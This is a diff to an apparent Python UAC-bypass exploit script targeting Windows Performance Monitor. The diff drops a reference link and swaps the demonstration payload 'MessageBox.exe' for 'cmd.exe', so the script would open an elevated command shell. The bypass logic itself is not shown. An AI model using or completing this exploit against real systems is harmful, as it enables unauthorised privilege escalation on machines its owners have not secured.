@@ -1,7 +1,6 @@
 """
 Works from: Windows 7
 Fixed in: Windows 10 RS3 (16299)
-https://bytecode77.com/hacking/exploits/uac-bypass/performance-monitor-privilege-escalation
 """
 import os
 import time
@@ -11,7 +10,7 @@ import tempfile
 from colorama import init, Fore
 init(convert=True)
 
-payload = "MessageBox.exe"
+payload = "c:\\windows\\system32\\cmd.exe"
 
 def successBox():
 	return (Fore.GREEN + '[+]' + Fore.RESET)
